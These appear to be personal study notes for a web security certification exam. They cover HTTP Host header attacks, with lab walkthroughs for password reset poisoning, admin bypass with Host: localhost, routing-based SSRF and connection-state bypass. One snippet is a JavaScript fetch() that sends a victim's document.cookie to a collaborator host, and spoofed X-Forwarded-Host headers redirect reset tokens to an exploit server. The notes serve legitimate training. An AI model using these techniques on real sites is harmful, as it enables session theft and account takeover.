## Stage 1 + 2

![375](Host%20Headers-20251014223505164.png)

Expose web apps to vulnerabilities via HTTP host header attacks via misconfigurations. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Aka "Host header injection" attacks.
### What is it?
The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with. It is common for multiple websites and applications to be accessible at the same IP address with cloud solutions. Due IPv4 address exhaustion.

[Recommendations](https://portswigger.net/web-security/host-header#how-to-prevent-http-host-header-attacks)

### How to identify if vulnerable 
[more](https://portswigger.net/web-security/host-header/exploiting#how-to-test-for-vulnerabilities-using-the-http-host-header)
- supply an arbitrary host header
- inject duplicate host headers
```
GET /example HTTP/1.1 
Host: vulnerable-website.com 
Host: bad-stuff-here
```
- supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1 
Host: bad-stuff-here
```
- line wrapping
```
GET /example HTTP/1.1 
	Host: bad-stuff-here 
Host: vulnerable-website.com
```

### Spoof IP Address
> _**Identify**_ that altered HOST headers are supported,  
> which allows you to spoof your IP address and bypass the IP-based brute-force protection  
> or redirection attacks to do _**password reset**_ poisoning.

> Include the below `X-`  headers and change the username parameter on the password reset request to `Carlos` before sending the request.  
> In the BSCP exam if you used this exploit then it means you have not used a vulnerability that require user interaction and allow you to use an interaction vulnerability to gain access to stage 3 as admin by using exploit server `Deliver exploit to victim` function.

```html
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
```

> Tips & Notes from _**fullfox**_:
- When spoofing host header on password reset using `Host:` or `X-Forwarded-Host:`, if you receive the error `Invalid hostname`, try using the following hostname: `xxx.oastify.com?TARGET.net` legit target URL without a slash.


### Identify Vulnerabilities in Exam
**Found in Forgot password feature**
- `Host` to `example.com`
	- 200 OK
		1. **Solution:** set `Host: {EXPLOIT SERVER URL}` 
		2. `username=carlos`
		3. Check access log for password reset token
		4. If `Host` doesn't work, try the 3 `X` headers above
			1. [Host Headers](Host%20Headers.md#1.1%20Lab%20Basic%20password%20reset%20poisoning%20%E2%AD%95%EF%B8%8F)
		5. --
		6. "Admin interface only available to local users" (Stage 2?)
			1. **Solution**: set `Host: localhost`
				1. [Host Headers](Host%20Headers.md#1.2.%20Lab%20Host%20header%20authentication%20bypass%20%E2%AD%95%EF%B8%8F)
	- 421 Misdirected Request
		- [Host Headers](Host%20Headers.md#1.11%20Lab%20Password%20reset%20poisoning%20via%20middleware%20%E2%AD%95%EF%B8%8F)
	- AND `GET /admin` == 301 Moved Permanently
		- [Host Headers](Host%20Headers.md#1.6.%20Lab%20Host%20validation%20bypass%20via%20connection%20state%20attack%20%E2%AD%95%EF%B8%8F)
	- 403 Forbidden or add another Host headers + got 200 OK + 2nd host reflected in response
		- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.x.%20Lab%20Web%20cache%20poisoning%20via%20ambiguous%20requests%20%E2%AD%95%EF%B8%8F)
Lab: Web cache poisoning via ambiguous requests
Send victim cookie to burp collaborator
```
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});

fetch(`https://collaborator.net/x`+document.cookie);
```

- `Host` to burp collaborator == got DNS + HTTP callback
	- **Solution:** Intruder `Host: 192.168.0.$0$`
		- [Host Headers](Host%20Headers.md#1.4.%20Lab%20Routing-based%20SSRF%20%E2%AD%95%EF%B8%8F)

- Set the following == 504 Gateway Timeout
	- [SSRF](SSRF.md#1.x.%20Lab%20SSRF%20via%20flawed%20request%20parsing%20%E2%AD%95%EF%B8%8F)
```
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: YOUR_LAB_ID-hacker.web-security-academy.net
```


- - - 

#### 1.1 Lab: Basic password reset poisoning ⭕️
#password_reset
This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

1. Grab the POST request that initiate a password reset and replace the `Host` header with an arbitrary domain -- success
![454](Host%20Headers-20251014231857447.png)

2. In your email client, you will see a link with the arbitrary domain
![Host Headers-20251014232021642](Host%20Headers-20251014232021642.png)

3. In the same request as Step 1, change the `Host` header to your exploit server's domain and change the `username` body parameter to carlos
![Host Headers-20251014232343559](Host%20Headers-20251014232343559.png)

4. In your exploit server access log, you'll see a `temp-forgot-password-token` and this one belongs to carlos -- copy it
![Host Headers-20251014232633316](Host%20Headers-20251014232633316.png)

5. Get a forgot password POST request and replace that `temp-forgot-password-token` with carlos's and it will change his password -- login and solved
![Host Headers-20251014233013612](Host%20Headers-20251014233013612.png)
>[!tip] Real World Example
>So, in a real world scenario:
>1. we set the `Host` header to a server an attacker controls and set the `username` parameter to the victim's username
>2. an password reset email will be sent to the victim
>3. once the victim clicks on that link, the attacker's server logs will receive a GET request along with the password reset token since the token is in the URL
>4. then the attacker can use the token to reset the victim's password
>5. result: account takeover
>
>Requirements: **token in the URL** and **victim clicks on the password reset link**
>
>Thoughts: So if the victim resets the password first, then the attacker can't use the token to reset the password? The victim has to click on the link but don't reset their password for an attacker to pull this off??

- - - 
#### 1.2. Lab: Host header authentication bypass ⭕️ 
#authentication_bypass
This lab makes an assumption about the privilege level of the user based on the HTTP Host header. To solve the lab, access the admin panel and delete the user `carlos`.

1. Sending an arbitrary domain will still yield a 200 OK
![Host Headers-20251015204655714](Host%20Headers-20251015204655714.png)

2. Go to `/robots.txt` to find `/admin` is disallowed
![Host Headers-20251015204303222](Host%20Headers-20251015204303222.png)

3. says the admin panel is only for **local users**
![Host Headers-20251015204542762](Host%20Headers-20251015204542762.png)

4. Step 3 gives the hint about who can access admin so put `Host: localhost`
![Host Headers-20251015204851098](Host%20Headers-20251015204851098.png)

5. Send the request to the browser, delete carlos, copy the URL and put that back to the request in Repeater
![Host Headers-20251015205001101](Host%20Headers-20251015205001101.png)

>[!tip] Real World Example
>Want to access a page or feature that is only available for admins. So change the `Host` header to something like `admin.whatever.com` and hope to access it.

- - -
#### 1.4. Lab: Routing-based SSRF ⭕️
#ssrf
This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet a ^l7ffg1dmin panel located on an internal IP address.
To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

1. right click > insert collaborator payload on the `Host` header and got a 200 OK
![408](Host%20Headers-20251015210423764.png)

2. Go to the Collaborator tab and we have an HTTP request
![428](Host%20Headers-20251015210506080.png)

3. Go to `/admin` and send that request to Intruder and make sure it has all of these settings. Since the admin panel is located in one of the IPs in a specific range, we're going to enumerate to find it.
![Host Headers-20251015211036660](Host%20Headers-20251015211036660.png)

4. One of the results `192.168.0.245` will show a 200 OK then send that request to the browser and type `carlos` then delete
5. Go to HTTP history, grab that POST request, send to Repeater, replace `Host` with `192.168.0.245` then send
![464](Host%20Headers-20251015211434438.png)
>[!info] Difference Between SSRF and the Previous Authentication Lab
>This one uses an internal IP in the `Host` header and SSRF requires a server to open/route a connection (HTTP) to a target. Hence, why Collaborator was used. The previous lab's server checks the `Host` header if the subdomain is admin or not.

- - - 

#### 1.6. Lab: Host validation bypass via connection state attack ⭕️
#connection_state #ssrf
This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.
To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user `carlos`.

>Setting `Host: example.com` will also get you a 301

1. Send a GET request to Repeater, change the path to `/admin` and `Host: 192.168.0.1`. We got a 301 and directed back to the homepage.
![512](Host%20Headers-20251015213903205.png)

2. Duplicate the request, add it to the same group, change the 1st request back to `/` and the `Host` header to the original `...h1-web-security-academy.net`. Set `Connection` to `keep-alive`. Select Send group in a sequence (single connection) next to the Send button.
![269](Host%20Headers-20251015213815123.png)

3. Check the `/admin` request and we have a 200 OK. Right click on the response, `Show response in browser`, type carlos and Delete.
![411](Host%20Headers-20251015213847595.png)

4. In HTTP History, copy the path `/admin/delete` and the body parameters `csrf` and `username` and paste it to the 2nd request. Send and solved.
![444](Host%20Headers-20251015214601776.png)
>[!tip] Understanding Connection State Attacks
>If a server caches connection state, an attacker could *plant* a Host value and have later request inherit the connection state. This will bypass `Host` header validation. 
>
>This is why we send the grouped requests as a single connection. The 1st request with the OG `Host` header gets us a 200 OK but the 2nd request with the IP `Host` header got a 301. So, by sending it as a single connection the 1st request was accepted by the server (200 OK) then the following request was also accepted.
>
>**Real World Analogy**: At a bar and the bouncer is only letting people over 21 in. He checks the first person, they're 21, so bouncer lets them in. Bouncer then assumes that every person that comes after are also 21, thus, letting them in as well.

- - - 
#### 1.11 Lab: Password reset poisoning via middleware ⭕️
#password_reset #middleware 
This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

1. Use the Forgot Password feature and check the email client. See there's an email link to reset the account's password.
![421](Host%20Headers-20251015222023753.png)

2. Send the POST `/forgot-password` feature to Repeater. Add the `X-Forwarded-Host` header with an arbitrary domain. 200 OK means that header is supported.
![Host Headers-20251015221452601](Host%20Headers-20251015221452601.png)

3. Change `X-Forwarded-Host` to the exploit server and `username` to carlos.
![441](Host%20Headers-20251015221743093.png)

4. Check the access log and we will have carlos's password reset token.
![Host Headers-20251015221833577](Host%20Headers-20251015221833577.png)

5. Copy the password reset link from Step 1 and replace the token with carlos's then change the password. Sign in as carlos and solved.
![426](Host%20Headers-20251015222134408.png)
>[!tip] Middleware Attacks?
>Middleware/Backend components caches a Host from an earlier request when building password reset links. Generated password reset links will be sent to an attacker's domain. 
>
>**Requirements:** Must accept `X-Forwarded-Host` and password reset token in the URL?
>
>**Confusion**: In a real world example, will the victim have to click on the password reset link first then the token will be sent to the attacker's server? If that's the case, if the victim uses that token to reset their password, the attacker can't use it and change the victim's password.

